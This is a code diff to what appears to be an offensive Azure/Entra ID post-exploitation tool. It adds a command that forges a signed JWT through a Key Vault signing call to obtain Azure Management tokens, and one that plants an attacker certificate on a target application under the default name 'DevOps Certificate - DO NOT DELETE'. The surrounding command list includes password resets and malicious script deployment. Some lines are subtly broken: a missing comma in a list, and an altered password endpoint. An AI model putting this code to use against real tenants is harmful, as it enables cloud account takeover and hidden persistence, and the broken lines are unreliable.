@@ -58,8 +58,8 @@ def list_commands():
         ["Invoke-RefreshToSharePointToken", "Convert refresh token to SharePoint token (saved to sharepoint_tokens.txt)"],
         ["Invoke-CertToAccessToken", "Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)"],
         ["Invoke-ESTSCookieToAccessToken", "Convert ESTS cookie to MS Graph access token (saved to estscookie_tokens.txt)"],
-        ["Invoke-AppSecretToAccessToken", "Convert Azure Application secretText credentials to access token (saved to appsecret_tokens.txt)"]
-        #["New-SignedJWT", "Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token"]
+        ["Invoke-AppSecretToAccessToken", "Convert Azure Application secretText credentials to access token (saved to appsecret_tokens.txt)"],
+        ["New-SignedJWT", "Construct JWT and sign using Key Vault PEM certificate (Azure Key Vault access token required) then generate Azure Management token"]
     ]
 
     post_authenum_commands = [
@@ -75,6 +75,7 @@ def list_commands():
         ["Get-GroupMember", "Get all members of target group"],
         ["Get-AppRoleAssignments", "Get application role assignments for current user (default) or target user (--id)"],
         ["Get-ConditionalAccessPolicy", "Get conditional access policy properties"],
+        ["Get-Application", "Get Enterprise Application details for app (NOT object) ID (--id)"]
         ["Get-PersonalContacts", "Get contacts of the current user"],
         ["Get-CrossTenantAccessPolicy", "Get cross tenant access policy properties"],
         ["Get-PartnerCrossTenantAccessPolicy", "Get partner cross tenant access policy"],
@@ -120,6 +121,7 @@ def list_commands():
         ["Find-Object", "Find object via ID and display object properties"],
         ["Update-UserPassword", "Update the passwordProfile of the target user (NewUserS3cret@Pass!)"],
         ["Add-ApplicationPassword", "Add client secret to target application"],
+        ["Add-ApplicationCertificate", "Add client certificate to target application"],
         ["Add-ApplicationPermission", "Add permission to target application (application/delegated)"],
         ["Add-UserTAP", "Add new Temporary Access Password (TAP) to target user"],
         ["Add-GroupMember", "Add member to target group"],
@@ -302,6 +304,11 @@ def read_file_content(file_path):
     except UnicodeDecodeError:
         with open(file_path, 'r', encoding='utf-16') as file:
             return file.read()
+
+def read_and_encode_cert(cert_path):
+    with open(cert_path, 'rb') as cert_file:
+        cert_data = cert_file.read()
+    return base64.b64encode(cert_data).decode('utf-8')
 
 def format_list_style(data):
     if not data.get('value'):
@@ -637,7 +644,8 @@ def main():
     "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", 
     "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
     "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
-    "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "add-applicationpermission"
+    "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", 
+    "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application"
 ]
 
 
@@ -721,7 +729,8 @@ def main():
             "get-scriptcontent", "get-roledefinitions", "get-roleassignments", "display-avpolicyrules",
             "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallrulepolicyrules",
             "display-edrpolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
-            "add-exclusiongrouptopolicy","deploy-maliciousscript", "reboot-device", "add-applicationpermission"]:
+            "add-exclusiongrouptopolicy","deploy-maliciousscript", "reboot-device", "add-applicationpermission", "new-signedjwt",
+            "add-applicationcertificate", "get-application"]:
         if not args.token:
             print_red(f"[-] Error: --token is required for command")
             return
@@ -2012,7 +2021,6 @@ def main():
             access_token = token_response_json.get('access_token')
 
             if access_token:
-                #print_green(access_token)
                 print_green("[+] Token Obtained!\n")
                 for key, value in token_response_json.items():
                     print(f"[*] {key}: {value}")
@@ -2052,7 +2060,7 @@ def main():
             'grant_type': 'client_credentials',
             'client_id': client_id,
             'client_secret': client_secret,
-            'scope': 'https://graph.microsoft.com/.default'
+            'scope': 'https://graph.microsoft.com/.default' # can change e.g. 'https://management.azure.com/.default' for Az
         }
 
         # check cae for client_credential grants
@@ -2087,18 +2095,24 @@ def main():
         print("=" * 80)
 
     # new-signedjwt
-    # NEED TO TEST
     elif args.command and args.command.lower() == "new-signedjwt":
-        if not args.tenant or not args.cert or not args.id:
-            print_red("[-] Error: --tenant, --id, and --query arguments are required for Invoke-CertToAccessToken command")
-            # SharpGraphView.exe New-SignedJWT -id <appid> -tenant <tenantid> -query <https://targetvault.vault.net> -token <vault token> -key <certificate name>
+        if not args.tenant or not args.id:
+            print_red("[-] Error: --tenant and --id required for New-SignedJWT command")
             return
 
+        print_yellow("\n[*] New-SignedJWT")
+        print("=" * 80)
+        try:
+            kvURI = input("\nEnter Key Vault Certificate Identifier URL: ").strip()
+        except KeyboardInterrupt:
+            sys.exit()
+        keyName = kvURI.split('/certificates/', 1)[-1].split('/', 1)[0]
+
         # cert details
-        kv_uri = f"{kvURI}/certificates?api-version=7.3"
+        kv_uri = f"{kvURI.split('/certificates/')[0]}/certificates?api-version=7.3"
 
         headers = {
-            "Authorization": f"Bearer {accessToken}"
+            "Authorization": f"Bearer {access_token}"
         }
 
         response = requests.get(kv_uri, headers=headers)
@@ -2126,10 +2140,10 @@ def main():
 
         # create JWT
         print_green("\n[+] Forged JWT:")
-        app_id = id
-        audience = f"https://login.microsoftonline.com/{tenant}/oauth2/token"
+        app_id = args.id
+        audience = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token"
 
-        now = datetime.utcnow()
+        now = datetime.now(timezone.utc)
         jwt_expiration = int((now + timedelta(minutes=2)).timestamp())
         not_before = int(now.timestamp())
 
@@ -2148,8 +2162,15 @@ def main():
             "iss": app_id
         }
 
-        unsigned_jwt = jwt.encode(jwt_payload, None, algorithm=None, headers=jwt_header).split('.', 2)[:2]
-        unsigned_jwt = '.'.join(unsigned_jwt)
+        def base64url_encode(data):
+            return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')
+
+        # encode header and payload
+        header_encoded = base64url_encode(json.dumps(jwt_header))
+        payload_encoded = base64url_encode(json.dumps(jwt_payload))
+
+        # construct unsigned JWT
+        unsigned_jwt = f"{header_encoded}.{payload_encoded}"
 
         jwt_sha256_hash = hashlib.sha256(unsigned_jwt.encode()).digest()
         jwt_sha256_hash_b64 = base64.urlsafe_b64encode(jwt_sha256_hash).decode().rstrip('=')
@@ -2158,7 +2179,7 @@ def main():
         new_uri = f"{kid}/sign?api-version=7.3"
         user_agent = get_user_agent(args)
         headers = {
-            "Authorization": f"Bearer {accessToken}",
+            "Authorization": f"Bearer {access_token}",
             "Accept": "application/json",
             "User-Agent": user_agent
         }
@@ -2175,10 +2196,10 @@ def main():
         print(signed_jwt)
 
         # request azure management token
-        jwt_login = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+        jwt_login = f"https://login.microsoftonline.com/{args.tenant}/oauth2/v2.0/token"
 
         parameters = {
-            "client_id": id,
+            "client_id": args.id,
             "client_assertion": signed_jwt,
             "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
             "scope": "https://management.azure.com/.default",
@@ -2191,13 +2212,14 @@ def main():
             print(f"[-] Error: {response.status_code} ({response.reason}). {response.text}")
         else:
             print_green("\n[+] Azure Management Token Obtained!")
-            print(f"[*] Application ID: {id}")
-            print(f"[*] Tenant ID: {tenant}")
+            print(f"[*] Application ID: {args.id}")
+            print(f"[*] Tenant ID: {args.tenant}")
             print("[*] Scope: https://management.azure.com/.default")
 
             response_json = response.json()
             for key, value in response_json.items():
                 print(f"[*] {key}: {value}")
+        print("=" * 80)
 
 
     ##########################
@@ -2472,6 +2494,37 @@ def main():
             print_red(f"[-] Failed to retrieve CAP: {response.status_code}")
             print_red(response.text)
         print("=" * 80)
+
+    # get-application
+    elif args.command and args.command.lower() == "get-application":
+            if not args.id:
+                print_red("[-] Error: --id <appid> argument is required for Get-Application command")
+                return
+            
+            print_yellow("\n[*] Get-Application")
+            print("=" * 80)
+            api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"
+            if args.select:
+                api_url += "?$select=" + args.select
+
+            user_agent = get_user_agent(args)
+            headers = {
+                'Authorization': f'Bearer {access_token}',
+                'User-Agent': user_agent
+            }
+
+            response = requests.get(api_url, headers=headers)
+            if response.status_code == 200:
+                response_json = response.json()
+
+                for key, value in response_json.items():
+                    if key != "@odata.context":
+                        print(f"{key}: {value}")
+
+            else:
+                print_red(f"[-] Failed to retrieve Azure Application details: {response.status_code}")
+                print_red(response.text)
+            print("=" * 80)
 
     # get-personalcontacts
     elif args.command and args.command.lower() == "get-personalcontacts":
@@ -3497,6 +3550,73 @@ def main():
             print_red(response.text)
         print("=" * 80)
 
+    # add-applicationcertificate  
+    elif args.command and args.command.lower() == "add-applicationcertificate":
+        openssl = """
+Generate Certificate:
+openssl genrsa -out private.key 2048
+openssl req -new -key private.key -out request.csr
+openssl x509 -req -days 365 -in request.csr -signkey private.key -out certificate.crt
+openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.crt 
+        """
+        if not args.id or not args.cert:
+            print_red("[-] Error: --id and --cert required for Add-ApplicationCertificate command")
+            print_red(openssl)
+            return
+
+        print_yellow("\n[*] Add-ApplicationCertificate")
+        print("=" * 80)
+
+        # 1. Find existing certs so we don't remove them in the patch req
+        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
+        
+        user_agent = get_user_agent(args)
+        headers = {
+            'Authorization': 'Bearer ' + access_token,
+            'Content-Type':'application/json',
+            'User-Agent': user_agent
+        }
+        
+        response = requests.get(api_url, headers=headers)
+
+        if response.status_code == 200:
+            applications = response.json()
+            key_credentials = applications.get('keyCredentials', [])  
+        else:
+            print_red(f"[-] Error obtaining existing certificates {response.status_code}")
+            print_red(response.text)
+
+        # 2. patch app added our cert to the existing 
+        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
+        
+        try:
+            displayname = input("\nEnter Certificate Display Name: ").strip()
+            if not displayname:
+                displayname = "DevOps Certificate - DO NOT DELETE"
+        except KeyboardInterrupt:
+            sys.exit()
+
+        encoded_cert = read_and_encode_cert(args.cert)
+        new_key_credential = {
+            "type": "AsymmetricX509Cert",
+            "usage": "Verify",
+            "key": encoded_cert,
+            "displayName": displayname
+        }
+        key_credentials.append(new_key_credential)
+
+        data = {
+            "keyCredentials": key_credentials
+        }
+        
+        response = requests.patch(api_url, headers=headers, data=json.dumps(data))
+        if response.ok:
+            print_green("\n[+] Successfully added application certificate")
+        else:
+            print_red(f"\n[-] Failed to add certificate: {response.status_code}")
+            print_red(response.text)
+        print("=" * 80)
+
     # add-applicationpassword
     elif args.command and args.command.lower() == "add-applicationpassword":
         if not args.id:
@@ -3505,7 +3625,7 @@ def main():
 
         print_yellow("\n[*] Add-ApplicationPassword")
         print("=" * 80)
-        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}/addPassword"
+        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
 
         user_agent = get_user_agent(args)
         headers = {
